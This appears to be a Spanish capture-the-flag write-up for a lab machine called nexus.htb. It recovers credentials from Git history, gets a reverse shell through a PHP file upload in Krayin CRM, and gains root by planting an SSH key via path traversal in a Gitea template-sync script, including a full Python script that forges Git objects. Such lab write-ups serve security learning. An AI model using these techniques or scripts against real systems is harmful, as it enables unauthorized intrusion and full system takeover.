Subdominio Git

El primer subdominio interesante es git.nexus.htb. Al acceder encontramos una instalación de Gitea, utilizada para gestionar los repositorios del proyecto.

Dentro del repositorio perteneciente al usuario admin encontramos un archivo docker.yml y, entre los archivos del proyecto, referencias a un archivo .env.

Aunque las credenciales ya no aparecen en la versión actual del proyecto, podemos revisar el historial de cambios del repositorio y localizar una versión anterior que contiene información sensible.

Hallazgo: el historial de Git contiene credenciales que fueron eliminadas de la versión actual del proyecto, pero permanecen disponibles en commits anteriores.

Con las credenciales recuperadas podemos acceder al segundo subdominio: billing.nexus.htb.

Utilizamos el correo encontrado anteriormente: j.matthew@nexus.htb, junto con la contraseña obtenida del historial del repositorio.

Las credenciales son válidas y conseguimos acceder al panel de administración.

Revisando el perfil del usuario podemos identificar que la aplicación utilizada es Krayin CRM 2.2.0.

La versión resulta especialmente interesante debido a la existencia de una vulnerabilidad identificada como CVE-2026-38526, asociada a la posibilidad de conseguir ejecución remota de código.

En lugar de utilizar directamente un exploit automatizado, vamos a reproducir manualmente el vector de ataque.

Explotación

File Upload → RCE

Dentro del panel de Krayin encontramos la funcionalidad Compose Mail, que permite crear correos electrónicos y adjuntar archivos.

El problema se encuentra en el mecanismo de subida de archivos. Aunque la interfaz espera una imagen, el archivo adjunto no se valida correctamente y podemos proporcionar un archivo con una extensión diferente.

Debido a que el entorno ejecuta PHP, aprovechamos esta funcionalidad para subir un archivo reverse_shell.php.

Interceptamos la petición con Burp Suite y la enviamos para analizar la respuesta del servidor.

La respuesta nos proporciona la ruta en la que se ha almacenado el archivo subido.

Vector de ataque: subida de un archivo PHP ejecutable mediante una funcionalidad que originalmente esperaba recibir una imagen.

Antes de acceder al archivo, ponemos a la escucha nuestra máquina atacante: 

nc -lvnp 446

Finalmente accedemos desde el navegador a la ruta proporcionada por la respuesta del servidor. El código PHP se ejecuta y recibimos una conexión:

Escalada de privilegios

Gitea Template Directory Traversal

Con el usuario jones continuamos enumerando los servicios que se ejecutan periódicamente en el sistema.

Encontramos un temporizador de systemd que ejecuta un servicio de sincronización de plantillas cada dos minutos: 

systemctl list-timers
NEXT                    LEFT   UNIT                       ACTIVATES


Thu 2026-03-05 18:02:00 UTC  1min
gitea-template-sync.timer    gitea-template-sync.service

Investigando el servicio encontramos el script: 

/etc/gitea/template-sync.py

Este script clona los repositorios de plantillas y posteriormente sincroniza los archivos dentro del directorio de staging: 

/home/git/template-staging/<owner>/<repo>/

El problema aparece en el tratamiento de las rutas procedentes de git ls-tree. El script utiliza directamente os.path.join() sin validar correctamente los componentes de la ruta: 

target = os.path.join(stage_path, filepath)


os.makedirs(os.path.dirname(target), exist_ok=True)

Si una ruta contiene componentes .., podemos provocar un directory traversal y conseguir que el archivo se escriba fuera del directorio de staging previsto.

Concepto: la vulnerabilidad se produce porque las rutas provenientes del repositorio no se normalizan ni validan antes de utilizarlas para construir la ruta de destino.

El objetivo será utilizar esta vulnerabilidad para escribir una clave pública SSH en: 

/root/.ssh/authorized_keys

Generación de la clave SSH

Primero generamos localmente un par de claves SSH que utilizaremos posteriormente para autenticarnos como root: 

ssh-keygen -t ed25519 -f /tmp/.k -N ''

Creación del repositorio

Volvemos a Gitea utilizando las credenciales obtenidas anteriormente. Creamos un nuevo repositorio llamado rce y lo configuramos como repositorio de plantilla para que el servicio de sincronización pueda procesarlo.

A continuación clonamos el repositorio: 

cd /tmp


git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git

cd rce

touch README.md

Construcción del objeto Git

Las comprobaciones habituales de Git impiden crear directamente archivos cuyas rutas contienen componentes de recorrido como ...

Para evitar esta restricción construimos manualmente los objetos Git directamente dentro de .git/objects/. De esta forma podemos crear un árbol que contenga las rutas necesarias para que el servicio vulnerable las procese.

Creamos el archivo build.py con el siguiente contenido: 

#!/usr/bin/env python3


import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
h=("%s %d"%(t,len(data))).encode()+b"\x00"
s=h+data
sha=hashlib.sha1(s).hexdigest()


d=os.path.join(".git","objects",sha[:2])
os.makedirs(d,exist_ok=True)

p=os.path.join(d,sha[2:])

if not os.path.exists(p):
    open(p,"wb").write(zlib.compress(s))

return sha


def entry(mode,name,sha):
return ("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
print("Run inside git repo")
sys.exit(1)

r=subprocess.run(
["cat","/tmp/.k.pub"],
capture_output=True,
text=True
)

if r.returncode!=0:
print("ssh-keygen -t ed25519 -f /tmp/.k -N ''")
sys.exit(1)

key=r.stdout.strip()+"\n"

blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")

ssh_t=write_obj(
entry("100644","authorized_keys",blob),
"tree"
)

cur=write_obj(
entry("40000",".ssh",ssh_t),
"tree"
)

fir=write_obj(
entry("40000","root",cur),
"tree"
)

for i in range(4):
fir=write_obj(
entry("40000","..",fir),
"tree"
)

root=write_obj(
entry("100644","README.md",readme)+
entry("40000","..",fir),
"tree"
)

ts=int(time.time())

c="tree %s\nauthor x [x@x](mailto:x@x) %d +0000\ncommitter x [x@x](mailto:x@x) %d +0000\n\ninit\n"%(root,ts,ts)

sha=write_obj(c.encode(),"commit")

os.makedirs(
os.path.join(".git","refs","heads"),
exist_ok=True
)

open(
os.path.join(".git","refs","heads","main"),
"w"
).write(sha+"\n")

print("Done: "+sha)

Ejecutamos el script: 

python3 /tmp/build.py

Obtenemos:

Done: 025b473292e1fdcdb027771defd8d3d0279c709f

Finalmente hacemos push de la rama creada: 

git push -u origin main --force

Ahora debemos esperar a que se ejecute el temporizador de sincronización de plantillas.

Cuando el servicio procesa nuestro repositorio, interpreta las rutas con los componentes .. y termina escribiendo la clave pública en el directorio SSH de root.

Resultado: la vulnerabilidad de directory traversal permite escapar del directorio de staging y escribir el archivo /root/.ssh/authorized_keys.

Acceso como root

Una vez que nuestra clave pública se encuentra en /root/.ssh/authorized_keys, podemos utilizar la clave privada generada anteriormente para autenticarnos como root: 

ssh -i /tmp/.k root@nexus.htb

Finalmente conseguimos una shell como root: 

Welcome to Ubuntu 24.04.4 LTS


(GNU/Linux 6.8.0-106-generic x86_64)

root@nexus:~# ls -la /root/root.txt

-rw-r----- 1 root root 21 Apr 23 18:14 /root/root.txt

Con esto obtenemos acceso completo a la máquina y podemos leer la flag de root.
